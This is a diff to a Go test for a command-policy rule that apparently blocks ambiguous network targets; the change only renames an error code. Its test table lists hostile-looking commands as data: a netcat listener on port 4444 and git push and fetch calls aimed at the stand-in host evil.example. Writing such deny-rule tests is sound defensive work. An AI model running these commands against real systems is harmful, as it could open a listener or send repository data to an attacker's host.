@@ -84,8 +84,8 @@ func TestNetworkRuleFailsClosedForAmbiguousTargets(t *testing.T) {
 		{"git push repeated repo", "git push --repo=api.github.com --repo=evil.example", "NETWORK_DOMAIN_DENIED"},
 		{"git repository config", "git -C repo fetch https://api.github.com/x", "NETWORK_OPTION_REVIEW"},
 		{"nc listener", "nc -l 4444", "NETWORK_OPTION_REVIEW"},
-		{"dynamic target", "curl $TARGET", "NETWORK_TARGET_UNPARSEABLE"},
-		{"unknown client target", "custom-fetch evil.example", "NETWORK_TARGET_UNPARSEABLE"},
+		{"dynamic target", "curl $TARGET", "NETWORK_TARGET_UNPARSABLE"},
+		{"unknown client target", "custom-fetch evil.example", "NETWORK_TARGET_UNPARSABLE"},
 	}
 	for _, test := range tests {
 		t.Run(test.name, func(t *testing.T) {
